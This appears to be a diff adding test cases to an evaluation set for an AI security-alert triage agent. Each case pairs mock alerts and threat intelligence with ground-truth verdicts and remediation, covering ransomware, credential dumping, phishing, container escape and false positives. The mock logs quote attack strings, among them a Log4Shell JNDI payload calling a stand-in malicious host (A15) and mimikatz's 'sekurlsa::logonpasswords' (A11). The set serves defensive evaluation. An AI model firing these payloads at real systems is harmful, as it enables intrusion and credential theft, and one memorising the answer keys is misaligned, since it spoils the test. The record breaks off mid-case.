+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check", "trigger": "每 10 条抽 1" }
+    ]
+  },
+  {
+    "test_case_id": "A08",
+    "scenario": "堡垒机管理员正常登录操作被误判为横向移动（误报）",
+    "difficulty": "easy",
+    "is_positive": false,
+    "expected_severity": "false_positive",
+    "expected_attack_type": "none",
+    "input": {
+      "alert_id": "A08",
+      "trigger_context": "EDR 告警：IP 10.0.5.10（堡垒机）在短时间内登录多个生产服务器，疑似横向移动。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A08": {
+        "alert_id": "A08",
+        "severity_original": "high",
+        "rule_name": "Lateral Movement - Multiple RDP/SSH Logins from Single Source",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-10T09:05:12Z",
+        "raw_log": "Source 10.0.5.10 established RDP session to 10.0.1.5, then SSH to 10.0.1.6, 10.0.1.7 within 5 minutes",
+        "source_ip": "10.0.5.10",
+        "destination_ip": "10.0.1.5",
+        "source_port": 33890,
+        "destination_port": 3389,
+        "protocol": "TCP",
+        "payload_highlights": ["3 successful logins to different critical servers from same source IP"],
+        "related_iocs": [
+          { "type": "ip", "value": "10.0.5.10" }
+        ]
+      },
+      "query_asset_info_10.0.5.10": {
+        "ip": "10.0.5.10",
+        "hostname": "bastion-prod-01",
+        "os": "Windows Server 2022",
+        "department": "运维部",
+        "business_system": "生产环境堡垒机",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": true,
+        "is_honeypot": false,
+        "owner": "ops.admin@company.com",
+        "network_zone": "办公网",
+        "tags": ["bastion", "jump-server", "authorized"]
+      },
+      "query_threat_intel_ip_10.0.5.10": {
+        "ioc_type": "ip",
+        "ioc_value": "10.0.5.10",
+        "is_malicious": false,
+        "reputation_score": 100,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "Internal Asset DB",
+        "confidence": "high",
+        "raw_intel": "Internal bastion host, all connections are logged and audited. No malicious activity."
+      },
+      "query_related_alerts_10.0.5.10_48h": {
+        "query_params": { "ip": "10.0.5.10", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_asset_info"],
+      "expected_judgment": {
+        "severity": "false_positive",
+        "attack_type": "none",
+        "min_confidence": 0.95,
+        "key_evidence_must_include": [
+          "源 IP 10.0.5.10 是堡垒机，资产标签 is_bastion=true",
+          "所有连接均为运维人员通过堡垒机的正常管理操作",
+          "威胁情报无恶意记录"
+        ],
+        "key_evidence_must_not_include": ["攻击者横向移动到生产环境"]
+      },
+      "expected_remediation_must_include": [
+        "将堡垒机 IP 加入横向移动检测白名单",
+        "建议 SIEM 规则关联资产 CMDB 数据过滤堡垒机告警"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 query_alert_detail 和 query_asset_info" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A09",
+    "scenario": "数据库服务器向外传输大量数据，疑似数据外泄",
+    "difficulty": "easy",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "data_exfiltration",
+    "input": {
+      "alert_id": "A09",
+      "trigger_context": "DLP 告警：主机 10.0.1.50 在过去 10 分钟向外部 IP 198.51.100.99 上传 2.3GB 数据，连接使用 HTTPS。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A09": {
+        "alert_id": "A09",
+        "severity_original": "critical",
+        "rule_name": "Data Exfiltration - Abnormal Outbound Transfer Volume",
+        "source": "DLP",
+        "timestamp": "2026-07-14T01:23:45Z",
+        "raw_log": "Flow: 10.0.1.50:45987 -> 198.51.100.99:443, 2.3GB in 10 min, application=SSL, file type=unknown",
+        "source_ip": "10.0.1.50",
+        "destination_ip": "198.51.100.99",
+        "source_port": 45987,
+        "destination_port": 443,
+        "protocol": "TCP",
+        "payload_highlights": ["outbound volume 2.3GB in 10 minutes, typical baseline 50MB/day", "destination IP in untrusted geo"],
+        "related_iocs": [
+          { "type": "ip", "value": "198.51.100.99" }
+        ]
+      },
+      "query_asset_info_10.0.1.50": {
+        "ip": "10.0.1.50",
+        "hostname": "db-master-01",
+        "os": "Ubuntu 22.04",
+        "department": "核心业务部",
+        "business_system": "在线交易数据库（MySQL）",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "dba@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["database", "critical", "pii"]
+      },
+      "query_threat_intel_ip_198.51.100.99": {
+        "ioc_type": "ip",
+        "ioc_value": "198.51.100.99",
+        "is_malicious": true,
+        "reputation_score": 15,
+        "threat_tags": ["data_exfiltration", "C2"],
+        "associated_apt": "Sandworm",
+        "first_seen": "2026-06-10",
+        "last_seen": "2026-07-14",
+        "geo_location": "RU",
+        "source": "Recorded Future, CrowdStrike",
+        "confidence": "high",
+        "raw_intel": "IP linked to Sandworm APT infrastructure, used as exfiltration endpoint in previous campaigns targeting database servers."
+      },
+      "query_related_alerts_10.0.1.50_48h": {
+        "query_params": { "ip": "10.0.1.50", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 0,
+        "related_alerts": []
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "data_exfiltration",
+        "min_confidence": 0.88,
+        "key_evidence_must_include": [
+          "流量基线严重偏离，10 分钟外传 2.3GB",
+          "目标 IP 198.51.100.99 被情报关联至 Sandworm APT 组织数据外泄活动",
+          "源主机为存储敏感数据的核心数据库"
+        ],
+        "key_evidence_must_not_include": ["外传流量为正常备份到云存储"]
+      },
+      "expected_remediation_must_include": [
+        "立即切断 10.0.1.50 的外网连接，保留内存和磁盘证据",
+        "封锁防火墙到 198.51.100.99 的出站流量",
+        "启动应急响应，排查数据库入侵点及数据泄露范围"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 query_alert_detail 和 query_threat_intel" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A10",
+    "scenario": "勒索软件加密文件行为，关联扫描与横向移动",
+    "difficulty": "medium",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "ransomware",
+    "input": {
+      "alert_id": "A10",
+      "trigger_context": "EDR 告警：主机 10.0.4.20 检测到大量文件被重命名为 .lockbit 扩展，疑似勒索软件。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A10": {
+        "alert_id": "A10",
+        "severity_original": "critical",
+        "rule_name": "Ransomware Detected - Mass File Rename with Known Extension",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-12T22:10:33Z",
+        "raw_log": "Process encryptor.exe (PID 5678) renamed 5000+ files to .lockbit extension in /srv/shared. Shadow copies deleted.",
+        "source_ip": "10.0.4.20",
+        "destination_ip": null,
+        "source_port": null,
+        "destination_port": null,
+        "protocol": null,
+        "payload_highlights": ["ransom note README.txt dropped", "lockbit extension", "vssadmin delete shadows executed"],
+        "related_iocs": [
+          { "type": "hash", "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0" },
+          { "type": "domain", "value": "lockbit-payment.onion" }
+        ]
+      },
+      "query_asset_info_10.0.4.20": {
+        "ip": "10.0.4.20",
+        "hostname": "file-server-03",
+        "os": "Windows Server 2019",
+        "department": "核心业务部",
+        "business_system": "共享文件服务器",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "storage.team@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["file-server", "critical", "shares"]
+      },
+      "query_threat_intel_hash_a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0": {
+        "ioc_type": "hash",
+        "ioc_value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
+        "is_malicious": true,
+        "reputation_score": 1,
+        "threat_tags": ["ransomware", "lockbit"],
+        "associated_apt": null,
+        "first_seen": "2026-07-10",
+        "last_seen": "2026-07-12",
+        "geo_location": null,
+        "source": "VirusTotal, MalwareBazaar",
+        "confidence": "high",
+        "raw_intel": "LockBit 3.0 ransomware encryptor. Uses RSA-2048 and AES encryption. Observed in multiple sectors."
+      },
+      "query_threat_intel_domain_lockbit-payment.onion": {
+        "ioc_type": "domain",
+        "ioc_value": "lockbit-payment.onion",
+        "is_malicious": true,
+        "reputation_score": 0,
+        "threat_tags": ["ransomware", "C2"],
+        "associated_apt": null,
+        "first_seen": "2026-06-01",
+        "last_seen": "2026-07-12",
+        "geo_location": null,
+        "source": "Recorded Future",
+        "confidence": "high",
+        "raw_intel": "Tor hidden service used by LockBit gang for ransom negotiation."
+      },
+      "query_related_alerts_10.0.4.20_48h": {
+        "query_params": { "ip": "10.0.4.20", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 2,
+        "related_alerts": [
+          {
+            "alert_id": "A10-REL-01",
+            "alert_type": "Port Scan",
+            "severity": "medium",
+            "timestamp": "2026-07-12T20:45:00Z",
+            "summary": "Internal host 10.0.4.20 scanned port 445 across multiple file servers."
+          },
+          {
+            "alert_id": "A10-REL-02",
+            "alert_type": "Suspicious PsExec",
+            "severity": "high",
+            "timestamp": "2026-07-12T21:30:00Z",
+            "summary": "PsExec executed from 10.0.4.20 to 10.0.4.21 to deploy encryptor."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "critical",
+        "attack_type": "ransomware",
+        "min_confidence": 0.95,
+        "key_evidence_must_include": [
+          "文件重命名为 .lockbit 扩展名，匹配 LockBit 3.0 特征",
+          "加密程序哈希被确认为 LockBit 变种",
+          "检测到删除卷影副本行为",
+          "关联告警显示 1 小时前同一主机进行 SMB 扫描和 PsExec 横向部署"
+        ],
+        "key_evidence_must_not_include": ["该行为是红队演习", "文件加密是正常磁盘操作"]
+      },
+      "expected_remediation_must_include": [
+        "立即隔离所有受感染主机（10.0.4.20 及关联横向对象）",
+        "封锁 lockbit-payment.onion 和相关 C2 通信",
+        "从离线备份中恢复加密文件，不要支付赎金",
+        "阻断网络内部 SMB 和 RDP 端口，防止进一步传播"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel 和 related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A11",
+    "scenario": "Mimikatz 凭证转储检测，关联异常登录告警",
+    "difficulty": "medium",
+    "is_positive": true,
+    "expected_severity": "high",
+    "expected_attack_type": "credential_dump",
+    "input": {
+      "alert_id": "A11",
+      "trigger_context": "EDR 告警：主机 10.0.1.30 检测到进程 lsass.exe 被 mimikatz 访问，疑似凭证转储。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A11": {
+        "alert_id": "A11",
+        "severity_original": "high",
+        "rule_name": "Mimikatz - Credential Dumping via LSASS Access",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-11T08:55:20Z",
+        "raw_log": "Process mimikatz.exe (PID 9102) accessed lsass.exe handle with PROCESS_VM_READ rights. Command line: sekurlsa::logonpasswords",
+        "source_ip": "10.0.1.30",
+        "destination_ip": null,
+        "source_port": null,
+        "destination_port": null,
+        "protocol": null,
+        "payload_highlights": ["mimikatz.exe accessing lsass.exe", "sekurlsa::logonpasswords command"],
+        "related_iocs": [
+          { "type": "hash", "value": "f1e2d3c4b5a6079889706f5e4d3c2b10" }
+        ]
+      },
+      "query_asset_info_10.0.1.30": {
+        "ip": "10.0.1.30",
+        "hostname": "dc-backup-01",
+        "os": "Windows Server 2022",
+        "department": "运维部",
+        "business_system": "备份域控制器",
+        "asset_level": "critical",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "domain.admin@company.com",
+        "network_zone": "生产-核心",
+        "tags": ["domain-controller", "critical"]
+      },
+      "query_threat_intel_hash_f1e2d3c4b5a6079889706f5e4d3c2b10": {
+        "ioc_type": "hash",
+        "ioc_value": "f1e2d3c4b5a6079889706f5e4d3c2b10",
+        "is_malicious": true,
+        "reputation_score": 2,
+        "threat_tags": ["credential_dump", "mimikatz"],
+        "associated_apt": "APT28",
+        "first_seen": "2026-06-01",
+        "last_seen": "2026-07-11",
+        "geo_location": null,
+        "source": "VirusTotal, Mandiant",
+        "confidence": "high",
+        "raw_intel": "Mimikatz binary commonly used by APT28 for credential harvesting during lateral movement."
+      },
+      "query_related_alerts_10.0.1.30_48h": {
+        "query_params": { "ip": "10.0.1.30", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 2,
+        "related_alerts": [
+          {
+            "alert_id": "A11-REL-01",
+            "alert_type": "Suspicious Login",
+            "severity": "medium",
+            "timestamp": "2026-07-11T07:30:00Z",
+            "summary": "Successful login to 10.0.1.30 with domain admin account from non-IT workstation 10.0.3.99."
+          },
+          {
+            "alert_id": "A11-REL-02",
+            "alert_type": "Task Scheduler Creation",
+            "severity": "high",
+            "timestamp": "2026-07-11T08:45:00Z",
+            "summary": "Scheduled task 'UpdateCheck' created on 10.0.1.30 to execute mimikatz.exe."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "high",
+        "attack_type": "credential_dump",
+        "min_confidence": 0.85,
+        "key_evidence_must_include": [
+          "Mimikatz 执行凭证转储命令 sekurlsa::logonpasswords",
+          "哈希被情报关联至 APT28 常用工具",
+          "关联告警显示域管理员账户从异常工作站登录并创建计划任务执行 Mimikatz"
+        ],
+        "key_evidence_must_not_include": ["这是系统管理员正常维护操作"]
+      },
+      "expected_remediation_must_include": [
+        "立即隔离 10.0.1.30 和源工作站 10.0.3.99",
+        "重置所有域管理员密码和 Kerberos 票据",
+        "排查域内新增账户和计划任务"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A12",
+    "scenario": "用户点击钓鱼邮件链接下载恶意文档并执行宏",
+    "difficulty": "medium",
+    "is_positive": true,
+    "expected_severity": "high",
+    "expected_attack_type": "phishing",
+    "input": {
+      "alert_id": "A12",
+      "trigger_context": "EDR 告警：用户 10.0.3.55 从邮件链接下载了恶意文档 sales_report.docm，并触发了宏执行。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A12": {
+        "alert_id": "A12",
+        "severity_original": "high",
+        "rule_name": "Phishing - Malicious Document Download and Macro Execution",
+        "source": "EDR-Sensor",
+        "timestamp": "2026-07-13T14:30:12Z",
+        "raw_log": "Outlook.exe downloaded http://phishing.cn/doc/sales_report.docm; WINWORD.EXE executed process powershell -enc ...",
+        "source_ip": "10.0.3.55",
+        "destination_ip": "203.0.113.120",
+        "source_port": 52344,
+        "destination_port": 80,
+        "protocol": "TCP",
+        "payload_highlights": ["downloaded from phishing URL", "Word launched PowerShell with encoded command"],
+        "related_iocs": [
+          { "type": "url", "value": "http://phishing.cn/doc/sales_report.docm" },
+          { "type": "domain", "value": "phishing.cn" }
+        ]
+      },
+      "query_asset_info_10.0.3.55": {
+        "ip": "10.0.3.55",
+        "hostname": "sales-laptop-07",
+        "os": "Windows 11 23H2",
+        "department": "销售部",
+        "business_system": "销售人员终端",
+        "asset_level": "medium",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "li.si@company.com",
+        "network_zone": "办公网",
+        "tags": ["laptop", "sales"]
+      },
+      "query_threat_intel_url_http://phishing.cn/doc/sales_report.docm": {
+        "ioc_type": "url",
+        "ioc_value": "http://phishing.cn/doc/sales_report.docm",
+        "is_malicious": true,
+        "reputation_score": 10,
+        "threat_tags": ["phishing", "downloader"],
+        "associated_apt": "FIN7",
+        "first_seen": "2026-07-10",
+        "last_seen": "2026-07-13",
+        "geo_location": null,
+        "source": "URLhaus, PhishTank",
+        "confidence": "high",
+        "raw_intel": "URL used in FIN7 spear-phishing campaigns delivering weaponized Office documents with macros."
+      },
+      "query_threat_intel_domain_phishing.cn": {
+        "ioc_type": "domain",
+        "ioc_value": "phishing.cn",
+        "is_malicious": true,
+        "reputation_score": 15,
+        "threat_tags": ["phishing", "C2"],
+        "associated_apt": "FIN7",
+        "first_seen": "2026-07-01",
+        "last_seen": "2026-07-13",
+        "geo_location": "CN",
+        "source": "Recorded Future",
+        "confidence": "high",
+        "raw_intel": "Domain registered recently, used exclusively for FIN7 phishing payload delivery and C2."
+      },
+      "query_related_alerts_10.0.3.55_48h": {
+        "query_params": { "ip": "10.0.3.55", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 1,
+        "related_alerts": [
+          {
+            "alert_id": "A12-REL-01",
+            "alert_type": "Suspicious PowerShell",
+            "severity": "high",
+            "timestamp": "2026-07-13T14:35:00Z",
+            "summary": "PowerShell command attempted to download additional payload from c2.phishing.cn."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "high",
+        "attack_type": "phishing",
+        "min_confidence": 0.88,
+        "key_evidence_must_include": [
+          "钓鱼 URL 及其域名均被情报确认为 FIN7 组织使用的恶意载荷",
+          "Word 文档宏启动 PowerShell 下载额外载荷，关联告警证实后续下载行为",
+          "受感染主机属于销售部门，可能泄露客户信息"
+        ],
+        "key_evidence_must_not_include": ["该邮件是公司内部合规测试"]
+      },
+      "expected_remediation_must_include": [
+        "隔离受感染终端 10.0.3.55，阻断对 phishing.cn 和 c2.phishing.cn 的访问",
+        "通知用户立即更改所有密码",
+        "检查该用户的邮箱规则是否被篡改，扫描邮件历史定位钓鱼邮件"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A13",
+    "scenario": "员工大量下载文件触发 DLP 告警，实为定期备份任务（误报）",
+    "difficulty": "medium",
+    "is_positive": false,
+    "expected_severity": "false_positive",
+    "expected_attack_type": "insider_threat",
+    "input": {
+      "alert_id": "A13",
+      "trigger_context": "DLP 告警：内部用户 zhang.san 在 1 小时内从文件服务器下载了 15GB 数据。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A13": {
+        "alert_id": "A13",
+        "severity_original": "high",
+        "rule_name": "Data Exfiltration - Large Volume Download by Internal User",
+        "source": "DLP",
+        "timestamp": "2026-07-14T18:00:45Z",
+        "raw_log": "User zhang.san from 10.0.3.67 downloaded 15GB from share \\10.0.4.20\finance_archive via SMB.",
+        "source_ip": "10.0.3.67",
+        "destination_ip": "10.0.4.20",
+        "source_port": 445,
+        "destination_port": 445,
+        "protocol": "SMB",
+        "payload_highlights": ["user zhang.san", "downloaded 15GB in 1 hour", "target share finance_archive"],
+        "related_iocs": []
+      },
+      "query_asset_info_10.0.3.67": {
+        "ip": "10.0.3.67",
+        "hostname": "backup-srv-02",
+        "os": "Windows Server 2022",
+        "department": "运维部",
+        "business_system": "数据备份服务器",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "backup.admin@company.com",
+        "network_zone": "办公网",
+        "tags": ["backup", "automated-job"]
+      },
+      "query_threat_intel_ip_10.0.3.67": {
+        "ioc_type": "ip",
+        "ioc_value": "10.0.3.67",
+        "is_malicious": false,
+        "reputation_score": 100,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "Internal CMDB",
+        "confidence": "high",
+        "raw_intel": "Internal backup server, scheduled to pull archives from file shares daily at 18:00."
+      },
+      "query_related_alerts_10.0.3.67_48h": {
+        "query_params": { "ip": "10.0.3.67", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 1,
+        "related_alerts": [
+          {
+            "alert_id": "A13-REL-01",
+            "alert_type": "Scheduled Task Execution",
+            "severity": "info",
+            "timestamp": "2026-07-14T18:00:05Z",
+            "summary": "Scheduled task 'NightlyFinanceBackup' started on backup-srv-02."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_asset_info"],
+      "expected_judgment": {
+        "severity": "false_positive",
+        "attack_type": "none",
+        "min_confidence": 0.95,
+        "key_evidence_must_include": [
+          "源主机 10.0.3.67 是备份服务器，有每日自动备份任务",
+          "下载行为与计划任务 NightlyFinanceBackup 时间吻合",
+          "威胁情报无恶意记录，用户为系统服务账户"
+        ],
+        "key_evidence_must_not_include": ["内部员工窃取财务数据"]
+      },
+      "expected_remediation_must_include": [
+        "将备份服务器及任务加入 DLP 白名单，避免再次误报"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail 和 asset_info" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A14",
+    "scenario": "容器逃逸：特权容器挂载宿主机敏感目录",
+    "difficulty": "medium",
+    "is_positive": true,
+    "expected_severity": "high",
+    "expected_attack_type": "container_escape",
+    "input": {
+      "alert_id": "A14",
+      "trigger_context": "K8s 审计日志告警：容器 pod/evil-pod 在 default 命名空间以特权模式运行并挂载了 /var/run/docker.sock。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A14": {
+        "alert_id": "A14",
+        "severity_original": "high",
+        "rule_name": "Container Escape - Privileged Pod with Host Mounts",
+        "source": "K8s-Audit",
+        "timestamp": "2026-07-10T11:20:33Z",
+        "raw_log": "Pod evil-pod (UID 0) created with securityContext privileged: true, hostPath /var/run/docker.sock mounted to /var/run/docker.sock.",
+        "source_ip": "10.0.6.50",
+        "destination_ip": "10.0.6.1",
+        "source_port": null,
+        "destination_port": null,
+        "protocol": null,
+        "payload_highlights": ["privileged: true", "mount host docker socket", "run as root"],
+        "related_iocs": [
+          { "type": "ip", "value": "10.0.6.50" }
+        ]
+      },
+      "query_asset_info_10.0.6.50": {
+        "ip": "10.0.6.50",
+        "hostname": "k8s-worker-03",
+        "os": "Container-Optimized OS",
+        "department": "研发中心",
+        "business_system": "Kubernetes 生产集群节点",
+        "asset_level": "high",
+        "is_scanner": false,
+        "is_bastion": false,
+        "is_honeypot": false,
+        "owner": "platform.team@company.com",
+        "network_zone": "容器集群",
+        "tags": ["kubernetes", "worker-node"]
+      },
+      "query_threat_intel_ip_10.0.6.50": {
+        "ioc_type": "ip",
+        "ioc_value": "10.0.6.50",
+        "is_malicious": false,
+        "reputation_score": 100,
+        "threat_tags": [],
+        "associated_apt": null,
+        "first_seen": null,
+        "last_seen": null,
+        "geo_location": null,
+        "source": "Internal",
+        "confidence": "high",
+        "raw_intel": "Internal Kubernetes worker node, no external threat detected. The pod configuration itself is the IOC."
+      },
+      "query_related_alerts_10.0.6.50_48h": {
+        "query_params": { "ip": "10.0.6.50", "ioc_value": null, "time_window_hours": 48 },
+        "total_related": 2,
+        "related_alerts": [
+          {
+            "alert_id": "A14-REL-01",
+            "alert_type": "Suspicious Pod Creation",
+            "severity": "medium",
+            "timestamp": "2026-07-10T11:15:00Z",
+            "summary": "User jane.doe created pod with privileged flag via compromised CI token."
+          },
+          {
+            "alert_id": "A14-REL-02",
+            "alert_type": "Host Process Execution",
+            "severity": "high",
+            "timestamp": "2026-07-10T11:25:00Z",
+            "summary": "Process 'docker run -it alpine' detected on host via mounted docker socket."
+          }
+        ]
+      }
+    },
+    "ground_truth": {
+      "expected_tools_called": ["query_alert_detail", "query_asset_info", "query_threat_intel", "query_related_alerts"],
+      "expected_tools_minimum": ["query_alert_detail", "query_threat_intel", "query_related_alerts"],
+      "expected_judgment": {
+        "severity": "high",
+        "attack_type": "container_escape",
+        "min_confidence": 0.85,
+        "key_evidence_must_include": [
+          "特权容器挂载 Docker Socket，允许容器控制宿主机 Docker 守护进程",
+          "关联告警显示 CI token 被滥用创建该 pod，且已执行宿主机命令",
+          "攻击可能已突破容器隔离，获得宿主机控制权"
+        ],
+        "key_evidence_must_not_include": ["此配置是开发团队的正常调试容器"]
+      },
+      "expected_remediation_must_include": [
+        "立即删除 pod evil-pod，吊销被滥用的 CI token",
+        "审计所有特权容器，实施 Pod Security Standards restricted 策略",
+        "隔离节点 k8s-worker-03，进行主机取证"
+      ]
+    },
+    "graders": [
+      { "type": "code", "check": "tools_called_minimum", "rule": "必须调用 detail、intel、related_alerts" },
+      { "type": "code", "check": "output_schema", "rule": "合法 JSON" },
+      { "type": "code", "check": "severity_enum", "rule": "枚举" },
+      { "type": "code", "check": "confidence_range", "rule": "0-1" },
+      { "type": "code", "check": "remediation_not_empty", "rule": "≥10" },
+      { "type": "model", "check": "judgment_quality", "rubric": "三方面", "model": "gpt-4o-mini" },
+      { "type": "model", "check": "hallucination_check", "rubric": "验证", "model": "gpt-4o-mini" },
+      { "type": "human", "check": "spot_check" }
+    ]
+  },
+  {
+    "test_case_id": "A15",
+    "scenario": "Log4j 漏洞利用尝试并连接 C2",
+    "difficulty": "medium",
+    "is_positive": true,
+    "expected_severity": "critical",
+    "expected_attack_type": "exploitation",
+    "input": {
+      "alert_id": "A15",
+      "trigger_context": "WAF 检测到 Log4Shell 利用载荷 ${jndi:ldap://malicious.ldap/a}，随后主机发起 LDAP 回调连接。"
+    },
+    "mock_api_responses": {
+      "query_alert_detail_A15": {
+        "alert_id": "A15",
+        "severity_original": "critical",
+        "rule_name": "Log4j CVE-2021-44228 - JNDI Injection Attempt",
+        "source": "WAF",
+        "timestamp": "2026-07-14T05:15:02Z",
+        "raw_log": "GET /search?q=$%7Bjndi:ldap://malicious.ldap/a%7D HTTP/1.1 ... Later host 10.0.2.88 connected to malicious.ldap:1389",
+        "source_ip": "192.0.2.200",
+        "destination_ip": "10.0.2.88",
+        "source_port": 62341,
+        "destination_port": 8080,
+        "protocol": "TCP",
